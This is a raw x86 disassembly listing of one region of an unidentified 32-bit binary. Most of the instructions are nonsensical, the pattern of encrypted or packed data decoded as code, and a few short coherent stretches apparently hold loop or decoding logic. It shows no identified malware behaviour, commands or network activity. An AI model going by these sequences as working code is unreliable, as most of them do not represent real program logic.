  40b22b:	rol    DWORD PTR [edx+edi*2-0x70],cl
  40b22f:	mov    ds:0xeab6ea89,eax
  40b234:	outs   dx,DWORD PTR ds:[esi]
  40b235:	add    al,BYTE PTR [eax-0x3f91712b]
  40b23b:	ins    DWORD PTR es:[edi],dx
  40b23c:	xchg   ecx,eax
  40b23d:	lds    esi,FWORD PTR [ecx*1+0x205c1e14]
  40b244:	dec    ebp
  40b245:	outs   dx,BYTE PTR ds:[esi]
  40b246:	jo     0x40b267
  40b248:	ret    
  40b249:	dec    edi
  40b24a:	call   0x75b7245a
  40b24f:	neg    DWORD PTR [esi+0x69]
  40b252:	retw   0x52a7
  40b256:	mov    ds:0x3e6be56f,eax
  40b25b:	retf   0xf3b9
  40b25e:	inc    eax
  40b25f:	lds    ecx,FWORD PTR ds:0xf03a1864
  40b265:	add    BYTE PTR ds:0x46cee3c2,dh
  40b26b:	xchg   ebx,eax
  40b26c:	add    al,0xce
  40b26e:	inc    edi
  40b26f:	ret    0xc9a8
  40b272:	pop    ds
  40b273:	mov    ah,0x6a
  40b275:	gs jne 0x40b2f1
  40b278:	(bad)  
  40b279:	fisub  DWORD PTR [edi+0x19cd3be8]
  40b27f:	jbe    0x40b2c5
  40b281:	jmp    0x40b2c2
  40b283:	loopne 0x40b297
  40b285:	ds lock cmp eax,0x71185cd
  40b28c:	shrd   DWORD PTR [edx],ecx,cl
  40b28f:	rcl    ecx,0x10
  40b292:	imul   ebx,esp,0xffffffa7
  40b295:	mov    edi,0xd3bd71cc
  40b29a:	loope  0x40b2d4
  40b29c:	gs sbb esp,ecx
  40b29f:	daa    
  40b2a0:	sar    al,1
  40b2a2:	out    0x68,al
  40b2a4:	push   ebp
  40b2a5:	cmp    al,0x46
  40b2a7:	out    dx,eax
  40b2a8:	ret    
  40b2a9:	sbb    al,0xa3
  40b2ab:	inc    dl
  40b2ad:	jmp    0x40b28d
  40b2af:	out    dx,al
  40b2b0:	les    edx,FWORD PTR [ebx+0x1bab4ee9]
  40b2b6:	inc    ebp
  40b2b7:	out    dx,al
  40b2b8:	adc    al,0x9c
  40b2ba:	mov    ds:0xd193924d,al
  40b2bf:	pop    ss
  40b2c0:	aad    0x4c
  40b2c2:	sub    bh,BYTE PTR [edx]
  40b2c4:	je     0x40b32c
  40b2c6:	adc    edx,DWORD PTR [eax-0x3f]
  40b2c9:	fwait
  40b2ca:	(bad)  
  40b2cb:	sbb    eax,DWORD PTR [ecx]
  40b2cd:	shr    BYTE PTR [esi],cl
  40b2cf:	and    dh,BYTE PTR [edx+ebx*4-0xa]
  40b2d3:	jns    0x40b2df
  40b2d5:	mov    al,ds:0xd77f184e
  40b2da:	sahf   
  40b2db:	out    dx,al
  40b2dc:	sbb    al,0x7a
  40b2de:	fidiv  DWORD PTR [ecx-0x10d816ff]
  40b2e4:	mov    al,ds:0xbc50ae38
  40b2e9:	mov    eax,0xf35cee44
  40b2ee:	fs cmp ebp,ebp
  40b2f1:	mov    ebp,0xa4a4dea
  40b2f6:	pop    edi
  40b2f7:	ds xchg ecx,eax
  40b2f9:	stos   BYTE PTR es:[edi],al
  40b2fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2fb:	xor    dh,BYTE PTR [ebx+0x1c]
  40b2fe:	xor    esi,DWORD PTR [ebp-0x2f770a42]
  40b304:	push   eax
  40b305:	adc    BYTE PTR [edx],0xb0
  40b308:	bound  ebx,QWORD PTR [eax]
  40b30a:	fidiv  WORD PTR [edi+0xf4cd982]
  40b310:	and    eax,0x7aa4f3c1
  40b315:	mov    edi,DWORD PTR [edi+0x6a]
  40b318:	xchg   edi,eax
  40b319:	rcr    ah,1
  40b31b:	shl    dh,1
  40b31d:	and    dh,BYTE PTR [ecx-0x8e2bf63]
  40b323:	pop    esp
  40b324:	aam    0x9f
  40b326:	mov    ss,WORD PTR es:[ebx+0x3f1257c5]
  40b32d:	jecxz  0x40b326
  40b32f:	out    dx,eax
  40b330:	cdq    
  40b331:	fdivr  DWORD PTR [ecx+0x52]
  40b334:	je     0x40b370
  40b336:	shr    ah,0xdb
  40b339:	outs   dx,BYTE PTR ds:[esi]
  40b33a:	xor    al,0xf6
  40b33c:	scas   al,BYTE PTR es:[edi]
  40b33d:	cmp    ch,bl
  40b33f:	out    0xad,al
  40b341:	cdq    
  40b342:	repz aam 0x6a
  40b345:	and    ecx,ecx
  40b347:	inc    eax
  40b348:	adc    DWORD PTR [eax+0x6],ecx
  40b34b:	push   esi
  40b34c:	pcmpgtb mm5,mm6
  40b34f:	ret    
  40b350:	sti    
  40b351:	pop    ss
  40b352:	lahf   
  40b353:	and    BYTE PTR ds:0x127389c2,dh
  40b359:	or     bh,dl
  40b35b:	dec    ebx
  40b35c:	push   es
  40b35d:	jge    0x40b359
  40b35f:	in     al,dx
  40b360:	sbb    esi,ebp
  40b362:	ficom  WORD PTR [bp+si]
  40b365:	pop    es
  40b366:	leave  
  40b367:	hlt    
  40b368:	int3   
  40b369:	jb     0x40b3df
  40b36b:	test   eax,0xcacccd56
  40b370:	pop    es
  40b371:	bound  esi,QWORD PTR [eax]
  40b373:	xor    eax,0x38e83adc
  40b378:	cmp    DWORD PTR ss:[ebx+0x60],0x2b
  40b37d:	xchg   DWORD PTR [edi],ecx
  40b37f:	mov    ebp,0xc93d4898
  40b384:	mov    DWORD PTR [ecx+0x64],edx
  40b387:	mov    eax,0x7d1045b6
  40b38c:	pop    ss
  40b38d:	lea    esi,[edx-0x69]
  40b390:	pop    esi
  40b391:	in     al,dx
  40b392:	fcomp  DWORD PTR [ebx-0x28]
  40b395:	cmp    BYTE PTR [esp+ecx*1+0x154e0208],dl
  40b39c:	sub    edi,ebx
  40b39e:	popf   
  40b39f:	add    DWORD PTR [ebp-0x32],esi
  40b3a2:	idiv   BYTE PTR [edi-0x13]
  40b3a5:	and    BYTE PTR [edx],cl
  40b3a7:	cmp    eax,0x3c97bd8a
  40b3ac:	div    BYTE PTR ds:0xcab93027
  40b3b2:	adc    ch,ah
  40b3b4:	mov    WORD PTR [ebx-0x73],?
  40b3b7:	cmp    dh,BYTE PTR [esi]
  40b3b9:	clc    
  40b3ba:	(bad)  
  40b3bb:	xlat   BYTE PTR ds:[ebx]
  40b3bc:	ins    BYTE PTR es:[di],dx
  40b3be:	xchg   ebx,eax
  40b3bf:	in     al,0x28
  40b3c1:	mov    WORD PTR [eax],es
  40b3c3:	sahf   
  40b3c4:	mov    al,ds:0x9d4a9478
  40b3c9:	jne    0x40b39e
  40b3cb:	mov    bh,0xa4
  40b3cd:	call   0x58fc:0x9f214d7d
  40b3d4:	inc    esi
  40b3d6:	mov    bl,bl
  40b3d8:	push   ebx
  40b3d9:	fdivrp st(5),st
  40b3db:	fadd   st,st(7)
  40b3dd:	dec    edi
  40b3de:	pop    edx
  40b3df:	pop    edx
  40b3e0:	mov    al,0x58
  40b3e2:	call   0x5b09:0x9ef686a
  40b3e9:	mov    edi,0xf8859126
  40b3ee:	add    al,0xc8
  40b3f0:	outs   dx,BYTE PTR ds:[esi]
  40b3f1:	aas    
  40b3f2:	hlt    
  40b3f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3f4:	aad    0xac
  40b3f6:	aas    
  40b3f7:	adc    BYTE PTR [esi],0xec
  40b3fa:	mov    esi,0x2489c69e
  40b3ff:	leave  
  40b400:	(bad)  
  40b402:	fisub  WORD PTR [edx+0x79bbda55]
  40b408:	cmp    DWORD PTR [ebx],ebp
  40b40a:	sub    al,0x59
  40b40c:	and    cl,dl
  40b40e:	sbb    al,0xb8
  40b410:	cdq    
  40b411:	imul   edx,DWORD PTR [esi],0xdf55d940
  40b417:	cdq    
  40b418:	bound  edx,QWORD PTR [ebx]
  40b41a:	or     BYTE PTR [ebx+0x1f],0x92
  40b41e:	bound  esp,QWORD PTR [eax]
  40b420:	cmp    BYTE PTR [edi],cl
  40b422:	and    eax,eax
  40b424:	repnz add eax,0x26948bd0
  40b42a:	push   ds
  40b42b:	xlat   BYTE PTR ds:[ebx]
  40b42c:	daa    
  40b42d:	dec    eax
  40b42e:	mov    dh,0x20
  40b430:	xlat   BYTE PTR ds:[ebx]
  40b431:	push   ebx
  40b432:	arpl   WORD PTR [ebp-0x7c],di
  40b435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b436:	cli    
  40b437:	test   DWORD PTR [ebx-0x74beba22],ecx
  40b43d:	xor    ah,BYTE PTR [ecx-0x45]
  40b440:	addr16 int3 
  40b442:	inc    esp
  40b443:	dec    ebx
  40b444:	mov    edx,edi
  40b446:	jmp    0xc5fe:0xe10
  40b44c:	shl    BYTE PTR [edx],cl
  40b44e:	inc    edi
  40b44f:	in     eax,0x18
  40b451:	(bad)
  40b455:	jecxz  0x40b448
  40b457:	jb     0x40b494
  40b459:	dec    ecx
  40b45a:	data16 int 0x76
  40b45d:	pop    ss
  40b45e:	lods   al,BYTE PTR ds:[esi]
  40b45f:	(bad)  
  40b460:	inc    ebx
  40b461:	xor    bh,BYTE PTR [ebx]
  40b463:	xchg   ch,dh
  40b465:	test   eax,0x8b238f68
  40b46a:	out    dx,eax
  40b46b:	sub    DWORD PTR [esp+edx*4+0x68],0xf2b8c034
  40b473:	cmp    bl,BYTE PTR [edx]
  40b475:	fcom   QWORD PTR [ebx+0xcb15d49]
  40b47c:	pop    ebp
  40b47d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b47e:	and    BYTE PTR [ebp+0x549b4dea],al
  40b484:	adc    bh,ch
  40b486:	std    
  40b487:	cmp    BYTE PTR ds:0xdaed5d4d,al
  40b48d:	xchg   esi,eax
  40b48e:	nop
  40b48f:	test   DWORD PTR [ebp+0x1d],ebx
  40b492:	in     eax,0x35
  40b494:	mov    edx,0x6dfc683f
  40b499:	xchg   esp,eax
  40b49a:	cmp    DWORD PTR [ebp+0x4a71a87a],ebp
  40b4a0:	jmp    0x40b4be
  40b4a2:	les    eax,FWORD PTR [ebx+ebp*1+0x675eeeb9]
  40b4a9:	sbb    DWORD PTR [ecx+0x6f786e61],edx
  40b4af:	sbb    bh,bl
  40b4b1:	iret   
  40b4b2:	shl    BYTE PTR [eax-0x151566c6],0x4c
  40b4b9:	add    al,0x1e
  40b4bb:	retf   
  40b4bc:	not    bh
  40b4be:	lods   al,BYTE PTR ds:[esi]
  40b4bf:	rol    BYTE PTR [ebx],cl
  40b4c1:	(bad)  
  40b4c2:	xor    ebx,DWORD PTR [edi]
  40b4c4:	pop    ecx
  40b4c5:	jecxz  0x40b450
  40b4c7:	sub    al,0xe8
  40b4c9:	inc    ecx
  40b4ca:	mov    ah,0xa
  40b4cc:	dec    ebp
  40b4cd:	out    0xc1,al
  40b4cf:	adc    eax,0x8f6bd3cc
  40b4d4:	ins    DWORD PTR es:[edi],dx
  40b4d5:	loopne 0x40b4b6
  40b4d7:	adc    bh,BYTE PTR [edi-0x36]
  40b4da:	pop    es
  40b4db:	inc    edx
  40b4dc:	mov    esi,0x864b76ca
  40b4e1:	outs   dx,DWORD PTR ds:[esi]
  40b4e2:	mov    BYTE PTR [ebx],dl
  40b4e4:	mov    al,cl
  40b4e6:	sbb    bl,bl
  40b4e8:	in     al,0x25
  40b4ea:	push   ebp
  40b4eb:	mov    BYTE PTR [ebx-0x13aac7ac],bh
  40b4f1:	lahf   
  40b4f2:	dec    edx
  40b4f3:	out    dx,al
  40b4f4:	and    ch,BYTE PTR [esi+0xd4bfd00]
  40b4fa:	pop    es
  40b4fb:	xchg   esi,eax
  40b4fc:	mov    ds:0xe1256188,al
  40b501:	xchg   BYTE PTR [eax+0xe],al
  40b504:	pop    ds
  40b505:	in     al,0x81
  40b507:	imul   esp,DWORD PTR [eax-0x41],0xffffff8f
  40b50b:	sub    edi,DWORD PTR [edx+ecx*2]
  40b50e:	test   al,0x12
  40b510:	pop    esi
  40b511:	add    ecx,DWORD PTR [edx+0x6e]
  40b514:	aad    0xda
  40b516:	popf   
  40b517:	inc    ebp
  40b518:	(bad)  
  40b519:	fdivr  DWORD PTR [eax]
  40b51b:	lahf   
  40b51c:	push   esi
  40b51d:	ins    DWORD PTR es:[edi],dx
  40b51e:	mov    al,ds:0xd7af0fa0
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	mov    eax,0xc1371fff
  40b554:	xchg   BYTE PTR [eax+0x70],dh
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b582
  40b55c:	loop   0x40b503
  40b55e:	mov    esi,db5
  40b561:	mov    edi,0x231488dd
  40b566:	in     eax,dx
  40b567:	and    eax,0x94862caa
  40b56c:	nop
  40b56d:	jecxz  0x40b541
  40b56f:	out    dx,al
  40b570:	ret    0xe3ef
  40b573:	pushf  
  40b574:	icebp  
  40b575:	call   0x75a:0x9beb8675
  40b57c:	and    BYTE PTR [ebp-0x3d],cl
  40b57f:	mov    al,ds:0xd0666cb2
  40b584:	hlt    
  40b585:	(bad)  ds:[esi-0x5ce93120]
  40b58c:	fisttp QWORD PTR [esi]
  40b58e:	jmp    0xa19c:0x2bed97bb
  40b595:	adc    edi,ecx
  40b597:	pop    esp
  40b598:	mov    al,ds:0x5141fad4
  40b59d:	retf   0xc843
  40b5a0:	pop    ds
  40b5a1:	js     0x40b529
  40b5a3:	xchg   BYTE PTR ds:0x12ad6abe,dh
  40b5a9:	xchg   BYTE PTR [esi],al
  40b5ab:	mov    al,ds:0x1b1311e7
  40b5b0:	scas   eax,DWORD PTR es:[edi]
  40b5b1:	dec    ebx
  40b5b2:	or     al,0x44
  40b5b4:	(bad)  
  40b5b5:	push   cs
  40b5b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5b7:	jae    0x40b600
  40b5b9:	mov    al,dl
  40b5bb:	hlt    
  40b5bc:	mov    esp,0x39856fcb
  40b5c1:	cld    
  40b5c2:	or     DWORD PTR [ebx+0x0],eax
  40b5c5:	inc    eax
  40b5c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5c7:	iret   
  40b5c8:	push   esi
  40b5c9:	pop    esp
  40b5ca:	les    edi,FWORD PTR ds:0xce5f8ee8
  40b5d0:	fwait
  40b5d1:	cmp    eax,0x84539112
  40b5d6:	aas    
  40b5d7:	in     al,dx
  40b5d8:	xchg   edx,eax
  40b5d9:	dec    edi
  40b5da:	lds    edx,FWORD PTR [ebx+0x79405b2d]
  40b5e0:	(bad)  
  40b5e1:	jmp    0x8a74:0x4ccdb2d7
  40b5e8:	aas    
  40b5e9:	cmp    DWORD PTR [ebx-0x5676c79],0x74
  40b5f0:	dec    bh
  40b5f2:	xor    dl,bl
  40b5f4:	inc    esi
  40b5f5:	retf   
  40b5f6:	dec    ebx
  40b5f7:	sub    eax,0x75e2a32e
  40b5fc:	push   0x68cde4f3
  40b601:	call   0xfecce882
  40b606:	fnstsw WORD PTR [esi]
  40b608:	mov    ch,0x21
  40b60a:	push   0x29
  40b60c:	mov    ds:0xd3b7f073,eax
  40b611:	cmp    esi,ebx
  40b613:	lahf   
  40b614:	fiadd  WORD PTR [ebx+0x3ec3740e]
  40b61a:	and    DWORD PTR [ecx],eax
  40b61c:	xor    eax,0x54b2e4e4
  40b621:	and    ecx,DWORD PTR [edi+0x2d]
  40b624:	setae  BYTE PTR [edi-0x11f53a61]
  40b62b:	pushf  
  40b62c:	jne    0x40b61b
  40b62e:	push   edx
  40b62f:	ss push ecx
  40b631:	shr    DWORD PTR [ebx],1
  40b633:	jp     0x40b5b9
  40b635:	dec    esi
  40b636:	mov    ebp,0x3d7b3f02
  40b63b:	or     al,0x9c
  40b63d:	pop    ds
  40b63e:	jecxz  0x40b5ed
  40b640:	sub    DWORD PTR [ebx],ebp
  40b642:	out    0x18,al
  40b644:	and    eax,0x92a069ce
  40b649:	sar    BYTE PTR [eax+0x497cb86d],0xc5
  40b650:	(bad)  
  40b651:	or     edx,ebp
  40b653:	pop    eax
  40b654:	or     ecx,DWORD PTR [ebx+edx*1-0x14]
  40b658:	test   ch,0xdf
  40b65b:	sahf   
  40b65c:	(bad)  
  40b65d:	push   esi
  40b65e:	adc    eax,esi
  40b660:	mov    ch,0x1a
  40b662:	dec    edx
  40b663:	push   edx
  40b664:	dec    ebp
  40b665:	mov    bh,ah
  40b667:	inc    edi
  40b668:	ds dec ecx
  40b66a:	or     dl,BYTE PTR [edi+0x6f]
  40b66d:	xchg   esi,eax
  40b66e:	xchg   esp,eax
  40b66f:	dec    ebx
  40b670:	mov    esi,0xc7bcf155
  40b675:	or     ebx,DWORD PTR [eax]
  40b677:	push   edx
  40b678:	in     al,dx
  40b679:	outs   dx,DWORD PTR ds:[esi]
  40b67a:	mov    ds:0x711262eb,al
  40b67f:	lods   al,BYTE PTR ds:[esi]
  40b680:	fidiv  DWORD PTR [eax-0x36]
  40b683:	out    0xe0,al
  40b685:	(bad)  
  40b686:	pop    ds
  40b687:	das    
  40b688:	clc    
  40b689:	jle    0x40b6c6
  40b68b:	xchg   edi,eax
  40b68c:	(bad)  
  40b68d:	xor    ah,BYTE PTR [ecx+ecx*2+0x6d2434c8]
  40b694:	and    DWORD PTR [ecx+0xe],ebp
  40b697:	mov    gs,esi
  40b699:	leave  
  40b69a:	fcom   QWORD PTR [esi+ecx*8+0x28]
  40b69e:	scas   eax,DWORD PTR es:[edi]
  40b69f:	test   BYTE PTR [esi-0x5a],0xac
  40b6a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6a4:	not    esp
  40b6a6:	or     DWORD PTR [edx],esp
  40b6a8:	jle    0x40b6ba
  40b6aa:	inc    ebp
  40b6ab:	(bad)  
  40b6ac:	jmp    0x40b6bd
  40b6ae:	out    dx,al
  40b6af:	test   eax,0xf936e5f3
  40b6b4:	xor    ecx,DWORD PTR [ecx-0x14]
  40b6b7:	dec    esp
  40b6b8:	fbld   TBYTE PTR ds:0x2303efa9
  40b6be:	test   BYTE PTR [eax],al
  40b6c0:	mov    fs,WORD PTR [ebx+ecx*8+0x60e8fb07]
  40b6c7:	xor    DWORD PTR [edx-0x6a],eax
  40b6ca:	ins    DWORD PTR es:[edi],dx
  40b6cb:	outs   dx,DWORD PTR ds:[esi]
  40b6cc:	mov    eax,0xa5ec07ea
  40b6d1:	fnsave [ebx+0x1a289bda]
  40b6d7:	sub    eax,0xdc0fcd07
  40b6dc:	add    al,0xb4
  40b6de:	aam    0xd
  40b6e0:	cmp    eax,0xacce3a7e
  40b6e5:	ds sar esp,1
  40b6e8:	mov    cl,0x55
  40b6ea:	imul   edx,DWORD PTR [ecx],0x76
  40b6ed:	xlat   BYTE PTR ds:[ebx]
  40b6ee:	adc    BYTE PTR [eax+0x54],bh
  40b6f1:	and    DWORD PTR [edx+0x309b3c],0x30
  40b6f8:	jmp    0x8b7e:0x419dec4e
  40b6ff:	ds adc ch,bl
  40b702:	out    0x93,eax
  40b704:	pop    ebx
  40b705:	and    DWORD PTR [ecx-0x455ca37c],edx
  40b70b:	sub    eax,0x8c829049
  40b710:	es push eax
  40b712:	xchg   ecx,eax
  40b713:	push   ds
  40b714:	xchg   ecx,eax
  40b715:	ret    0x66a1
  40b718:	adc    edx,ebx
  40b71a:	enter  0xdd0d,0xe5
  40b71e:	sub    edi,DWORD PTR [ebp+0x334938e7]
  40b724:	or     ebx,ecx
  40b726:	mov    esi,0x468e1ba3
  40b72b:	jmp    0x9c3e385c
  40b730:	inc    esp
  40b731:	into   
  40b732:	loopne 0x40b701
  40b734:	cmp    eax,DWORD PTR [ecx]
  40b736:	mov    ah,0xea
  40b738:	xchg   ebx,eax
  40b739:	add    ah,al
  40b73b:	adc    ch,ch
  40b73d:	jae    0x40b758
  40b73f:	jbe    0x40b74f
  40b741:	bound  esi,QWORD PTR [edx-0x2b6980e3]
  40b747:	xchg   esi,eax
  40b748:	mul    BYTE PTR [ebp-0x1108c0d4]
  40b74e:	cld    
  40b74f:	repz add BYTE PTR [edx-0x44],ah
  40b753:	mov    esp,0xc0674694
  40b758:	mov    ecx,0x37e111de
  40b75d:	gs sub eax,0xe227079b
  40b763:	mov    BYTE PTR [ebx],dh
  40b765:	or     eax,0x2408cd37
  40b76a:	xor    ebp,ebp
  40b76c:	sti    
  40b76d:	gs loope 0x40b7a6
  40b770:	xchg   edx,eax
  40b771:	test   DWORD PTR [ebp-0x41697e41],edx
  40b777:	sbb    eax,0xd4fbb6d5
  40b77c:	(bad)  
  40b77d:	std    
  40b77e:	shl    BYTE PTR [ebp-0x19],1
  40b781:	sbb    bh,BYTE PTR [ebx]
  40b783:	pushf  
  40b784:	mov    al,dh
  40b786:	loope  0x40b768
  40b788:	add    ebx,DWORD PTR [ebp-0x49]
  40b78b:	jl     0x40b7bb
  40b78d:	jmp    0x40b762
  40b78f:	push   edx
  40b790:	lea    ebp,[edx-0x3c]
  40b793:	loop   0x40b79e
  40b795:	mov    WORD PTR [ecx],ds
  40b797:	shl    DWORD PTR [edi],1
  40b799:	pop    edi
  40b79a:	adc    ebp,esp
  40b79c:	rol    DWORD PTR [esi],0x29
  40b79f:	xchg   esi,eax
  40b7a0:	cmp    al,0xee
  40b7a2:	mov    esp,0x8cc29d37
  40b7a7:	pop    ss
  40b7a8:	or     DWORD PTR [ecx-0x54],eax
  40b7ab:	xchg   cl,cl
  40b7ad:	sbb    bh,dl
  40b7af:	fwait
  40b7b0:	pop    eax
  40b7b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7b2:	loopne 0x40b783
  40b7b4:	xchg   edi,eax
  40b7b5:	mov    ds:0x7ab4e0d7,al
  40b7ba:	je     0x40b7f2
  40b7bc:	mov    ecx,0x6fec15e5
  40b7c1:	int    0xe1
  40b7c3:	pusha  
  40b7c4:	or     eax,0xfb911323
  40b7c9:	mov    BYTE PTR [edx+eiz*8],bl
  40b7cc:	loopne 0x40b7e4
  40b7ce:	ffree  st(7)
  40b7d0:	xchg   esi,eax
  40b7d1:	adc    BYTE PTR [esi-0x10],bl
  40b7d4:	cmp    al,0xc3
  40b7d6:	ror    DWORD PTR [ecx+0x28],0xfc
  40b7da:	dec    eax
  40b7db:	jo     0x40b7c4
  40b7dd:	or     BYTE PTR [di+0x59],dl
  40b7e1:	lea    ebx,[ebx]
  40b7e3:	adc    bl,dh
  40b7e5:	jmp    0x7bd8:0x2ae73436
  40b7ec:	lea    edx,[edx]
  40b7ee:	and    DWORD PTR [edx],esi
  40b7f0:	sbb    DWORD PTR [esi+0x3d],esp
  40b7f3:	popa   
  40b7f4:	jo     0x40b7ba
  40b7f6:	in     al,dx
  40b7f7:	push   ebx
  40b7f8:	cmp    eax,0x5611c3e4
  40b7fd:	or     BYTE PTR [edi],ch
  40b7ff:	scas   eax,DWORD PTR es:[edi]
  40b800:	jmp    0x15c2:0xbc65200f
  40b807:	enter  0x18eb,0x2
  40b80b:	into   
  40b80c:	pop    ds
  40b80d:	or     ah,al
  40b80f:	or     ax,0x2e76
  40b813:	and    dh,BYTE PTR [edx+0x1637be4c]
  40b819:	xor    DWORD PTR [edx+edx*2-0x1d854e2b],eax
  40b820:	scas   eax,DWORD PTR es:[edi]
  40b821:	popa   
  40b822:	ds aaa 
  40b824:	dec    edx
  40b825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b826:	das    
  40b827:	in     eax,0xf1
  40b829:	retf   
  40b82a:	mov    BYTE PTR [eax+0x0],dl
  40b82d:	cwde   
  40b82e:	and    DWORD PTR [edi+0x29],esp
  40b831:	mov    cl,0x8b
  40b833:	push   ecx
  40b834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b835:	adc    eax,0x171c586a
  40b83a:	adc    DWORD PTR [edi],esp
  40b83c:	xchg   ecx,eax
  40b83d:	std    
  40b83e:	ret    
  40b83f:	outs   dx,DWORD PTR ds:[esi]
  40b840:	mov    ?,eax
  40b842:	sbb    bl,BYTE PTR [edx]
  40b844:	cli    
  40b845:	ret    
  40b846:	lea    ebp,[esi]
  40b848:	das    
  40b849:	mov    ebx,0xd1c62d1e
  40b84e:	fstp   DWORD PTR [eax+eax*8+0x1b]
  40b852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b853:	mov    al,ds:0x9369627c
  40b858:	sub    DWORD PTR [ebx],0xffffffa7
  40b85b:	cmp    DWORD PTR [edx+0xd211291],edi
  40b861:	(bad)  
  40b862:	(bad)  
  40b863:	jg     0x40b840
  40b865:	std    
  40b866:	mov    ebx,0xbf21ebfd
  40b86b:	out    dx,eax
  40b86c:	in     al,0x32
  40b86e:	stc    
  40b86f:	pop    ss
  40b870:	mul    DWORD PTR [ebx]
  40b872:	loop   0x40b8c5
  40b874:	mov    eax,0x37eb93be
  40b879:	sbb    DWORD PTR [edi+0x2c],ebx
  40b87c:	jge    0x40b7fe
  40b87e:	or     al,0x4c
  40b880:	inc    ecx
  40b881:	mov    cl,0xad
  40b883:	out    dx,al
  40b884:	jl     0x40b8a8
  40b886:	ror    DWORD PTR [eax],1
  40b888:	lahf   
  40b889:	leave  
  40b88a:	sbb    al,0x21
  40b88c:	jge    0x40b893
  40b88e:	or     BYTE PTR ds:0xa333608e,0x81
  40b895:	push   esi
  40b896:	or     al,0x89
  40b898:	mov    dl,0x81
  40b89a:	xchg   esp,eax
  40b89b:	addr16 out 0xea,al
  40b89e:	or     al,0x39
  40b8a0:	lods   eax,DWORD PTR ds:[esi]
  40b8a1:	xchg   edx,eax
  40b8a2:	imul   BYTE PTR [ebx+ecx*4+0x4b]
  40b8a6:	or     eax,0xe38be584
  40b8ab:	stos   DWORD PTR es:[edi],eax
  40b8ac:	fs jp  0x40b914
  40b8af:	aas    
  40b8b0:	out    dx,al
  40b8b1:	sbb    eax,0xd1c62407
  40b8b6:	jge    0x40b86d
  40b8b8:	ret    0xaf47
  40b8bb:	lds    ecx,FWORD PTR ds:0xc104512e
  40b8c1:	mov    eax,ds:0xfc076f48
  40b8c6:	mov    dh,0x3d
  40b8c8:	sbb    BYTE PTR [edi+0x11c97d9f],0xb7
  40b8cf:	jae    0x40b929
  40b8d1:	in     eax,0x3d
  40b8d3:	mov    cl,0xc4
  40b8d5:	mov    edx,0x328f7b6d
  40b8da:	icebp  
  40b8db:	ds rol ebp,0x18
  40b8df:	inc    ebx
  40b8e0:	or     eax,0x9d8f6f81
  40b8e5:	jg     0x40b901
  40b8e7:	jmp    0x40b962
  40b8e9:	push   0x5f
  40b8eb:	push   eax
  40b8ed:	repnz aas 
  40b8ef:	xor    DWORD PTR ds:0x960ec8ee,edi
  40b8f5:	xor    BYTE PTR [esi],dl
  40b8f7:	sbb    edx,ebp
  40b8f9:	adc    BYTE PTR [edi+ecx*4-0x75],al
  40b8fd:	jge    0x40b8fb
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx+0x6f2c66fb],cl
  40b949:	lods   al,BYTE PTR ds:[esi]
  40b94a:	inc    eax
  40b94b:	pusha  
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b9c2
  40b954:	inc    edx
  40b955:	(bad)  
  40b957:	pop    esp
  40b958:	xor    bh,cl
  40b95a:	or     BYTE PTR [ebx-0x35d7a19e],bl
  40b960:	loopne 0x40b9be
  40b962:	icebp  
  40b963:	test   bh,bh
  40b965:	mov    ds:0x36dc64c9,al
  40b96a:	mov    edi,0x98fb0367
  40b96f:	call   0x203467d2
  40b974:	xchg   esp,eax
  40b975:	nop
  40b976:	dec    edi
  40b977:	mov    dh,0x8f
  40b979:	pop    es
  40b97a:	mov    BYTE PTR [edx-0xa],ch
  40b97d:	mov    ss,WORD PTR [ecx+edx*2+0x40]
  40b981:	enter  0x46d8,0x3
  40b985:	mov    esp,0x3745a13a
  40b98a:	je     0xc976d219
  40b990:	daa    
  40b991:	xlat   BYTE PTR ds:[ebx]
  40b992:	and    esi,edx
  40b994:	dec    ebp
  40b995:	nop
  40b996:	inc    ecx
  40b997:	pop    ss
  40b998:	std    
  40b999:	rcr    ecx,0x56
  40b99c:	or     eax,0x261a1c11
  40b9a1:	mov    al,BYTE PTR ds:0x95e32760
  40b9a7:	lea    edx,[edi-0x487b948a]
  40b9ad:	or     dl,BYTE PTR [eax]
